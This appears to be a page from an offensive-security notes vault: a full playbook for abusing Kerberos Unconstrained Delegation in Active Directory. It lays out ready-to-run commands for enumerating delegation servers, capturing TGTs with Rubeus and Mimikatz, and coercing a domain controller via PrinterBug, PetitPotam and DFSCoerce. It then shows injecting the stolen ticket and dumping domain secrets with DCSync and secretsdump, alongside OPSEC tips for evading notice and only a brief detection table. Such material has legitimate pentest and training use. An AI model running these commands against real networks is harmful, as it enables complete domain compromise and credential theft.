---
title: "Attack #15 — Unconstrained Delegation Abuse"
description: "Unconstrained Delegation is a legacy Kerberos feature that allows a service to impersonate any user to any other service in the domain. When a computer…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "credential-access", "delegation"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #15 — Unconstrained Delegation Abuse.md"
---
# 🟠 Attack #15 — Unconstrained Delegation Abuse

***

## 📖 How It Works

Unconstrained Delegation is a legacy Kerberos feature that allows a service to **impersonate any user to any other service** in the domain. When a computer object is configured with the `TRUSTED_FOR_DELEGATION` flag, any user authenticating to that computer via Kerberos **sends their entire TGT** inside the service ticket — and the computer caches it in LSASS memory. If an attacker compromises a server with Unconstrained Delegation, they can extract every cached TGT from memory and impersonate those users to any service in the domain.

The critical escalation path is **coercing a Domain Controller to authenticate** to the compromised server. Since DCs are computer accounts, their TGT carries machine-level privileges. With the DC's TGT, the attacker can perform DCSync and achieve full domain compromise.

### The Full Attack Flow

```
1. Enumerate servers with TRUSTED_FOR_DELEGATION flag
2. Compromise one of those servers (local admin required)
3. Set up Rubeus monitor to capture incoming TGTs
4. Coerce the DC to authenticate to your compromised server
   - PrinterBug / SpoolSample (MS-RPRN)
   - PetitPotam (MS-EFSR)
   - DFSCoerce (MS-DFSNM)
5. DC authenticates → its TGT is cached on your server
6. Extract the DC's TGT from LSASS memory
7. Inject the DC's TGT → DCSync → own the domain
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on Unconstrained Delegation server** | Required to extract TGTs from LSASS |
| **Unconstrained Delegation server exists** | Computer object with `TRUSTED_FOR_DELEGATION` flag |
| **Network access to coerce DC** | Must reach DC on RPC ports for coercion |
| **Print Spooler or EFS service running on DC** | For coercion methods to work |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Rubeus** | Windows | `monitor` mode to capture incoming TGTs in real-time |
| **Mimikatz** | Windows | `sekurlsa::tickets /export` to dump cached tickets |
| **SpoolSample** | Windows | PrinterBug coercion — forces DC to auth to you |
| **printerbug.py** | Linux | Impacket PrinterBug — remote coercion from Linux |
| **PetitPotam** | Linux/Windows | MS-EFSR coercion — no authentication required in some versions |
| **DFSCoerce** | Linux | MS-DFSNM coercion |
| **Coercer** | Linux | Multi-protocol coercion toolkit |
| **PowerView** | Windows | Enumerate Unconstrained Delegation servers |
| **BloodHound** | Both | Visual identification of delegation targets |

***

## 💻 Full Commands

### 🔵 Step 1 — Enumerate Unconstrained Delegation Servers

```powershell
# ── PowerView ─────────────────────────────────────────────────────────────────
Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained | Select-Object samaccountname, dnshostname, useraccountcontrol
# Ignore Domain Controllers — they always have Unconstrained Delegation

# ── AD Module ─────────────────────────────────────────────────────────────────
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, DNSHostName |
  Select-Object Name, DNSHostName, TrustedForDelegation

# ── LDAP Filter ───────────────────────────────────────────────────────────────
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties DNSHostName
```

```bash
# ── Linux — BloodHound.py + Impacket ──────────────────────────────────────────
findDelegation.py corp.local/low_user:'Password1' -dc-ip 10.10.10.10
# Shows all delegation types: Unconstrained, Constrained, RBCD

# ── NetExec ───────────────────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' --trusted-for-delegation
```

### 🔴 Step 2 — Monitor for Incoming TGTs (On Compromised Server)

```powershell
# ── Rubeus monitor mode — capture TGTs as they arrive ─────────────────────────
.\Rubeus.exe monitor /interval:5 /nowrap
# Runs continuously, printing base64-encoded TGTs as users authenticate
# Wait for the DC's TGT after triggering coercion

# ── Rubeus monitor with filter for specific user ──────────────────────────────
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
# Only shows TGTs from the DC machine account

# ── Alternative: Mimikatz — dump all cached tickets ──────────────────────────
privilege::debug
sekurlsa::tickets /export
# Exports all TGTs as .kirbi files from LSASS memory
```

### 🔴 Step 3 — Coerce DC Authentication

```bash
# ── PrinterBug / SpoolSample (MS-RPRN) ────────────────────────────────────────
# Forces DC to authenticate to your compromised server via Print Spooler
printerbug.py corp.local/low_user:'Password1'@DC01.corp.local COMPROMISED_SERVER.corp.local
# DC01 will auth to COMPROMISED_SERVER → TGT cached

# ── PetitPotam (MS-EFSR) — often works unauthenticated ───────────────────────
python3 PetitPotam.py COMPROMISED_SERVER.corp.local DC01.corp.local
# Or with credentials:
python3 PetitPotam.py -u low_user -p 'Password1' -d corp.local \
  COMPROMISED_SERVER.corp.local DC01.corp.local

# ── DFSCoerce (MS-DFSNM) ─────────────────────────────────────────────────────
python3 dfscoerce.py -u low_user -p 'Password1' -d corp.local \
  COMPROMISED_SERVER.corp.local DC01.corp.local

# ── Coercer (multi-protocol) ─────────────────────────────────────────────────
coercer coerce -u low_user -p 'Password1' -d corp.local \
  -l COMPROMISED_SERVER.corp.local -t DC01.corp.local
```

```powershell
# ── Windows — SpoolSample.exe ─────────────────────────────────────────────────
.\SpoolSample.exe DC01.corp.local COMPROMISED_SERVER.corp.local
```

### 🔴 Step 4 — Extract and Use DC's TGT

```powershell
# ── Rubeus — inject the captured DC TGT ──────────────────────────────────────
.\Rubeus.exe ptt /ticket:<base64_encoded_DC_TGT_from_monitor>

# ── DCSync with the DC's ticket ──────────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# ── Verify ────────────────────────────────────────────────────────────────────
klist
dir \\DC01.corp.local\C$
```

```bash
# ── Linux — convert and use ───────────────────────────────────────────────────
# If you captured a .kirbi file, convert to .ccache:
ticketConverter.py dc01_tgt.kirbi dc01_tgt.ccache

export KRB5CCNAME=dc01_tgt.ccache
secretsdump.py -k -no-pass corp.local/DC01\$@DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **Rubeus `monitor` mode is preferred** over Mimikatz for real-time TGT capture — it catches tickets as they arrive
- **PrinterBug requires Print Spooler running on DC** — check first with `ls \\DC01\pipe\spoolss`
- **PetitPotam may work unauthenticated** on unpatched DCs — most valuable coercion method
- **DCs always have Unconstrained Delegation** — they're not your targets; look for NON-DC servers with the flag

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | DC machine account (DC01$) authenticating to a workstation — unusual |
| **4768** | Security Log | TGT request patterns associated with coercion |
| **4769** | Security Log | TGS requests using the DC's captured TGT from non-DC source |
| **5145** | Security Log | Network share access from the coerced DC to the attacker's host |

***

## 🔗 Attack Chain Context

```
[Unconstrained Delegation] ──→ DC TGT Theft → Domain Compromise
         │
         ├──→ 🖨️ Coerce DC via PrinterBug/PetitPotam → capture DC TGT
         ├──→ 🩸 DC TGT → DCSync → KRBTGT hash → Golden Ticket
         ├──→ 🔗 Requires: local admin on UD server + coercion method
         ├──→ 🔗 Chain with: PetitPotam (#41), PrinterBug (#42)
         └──→ 💀 Defeated by: remove UD flag, disable Spooler on DCs, Protected Users
```

***

> ✅ **Attack #15 — Unconstrained Delegation complete.**
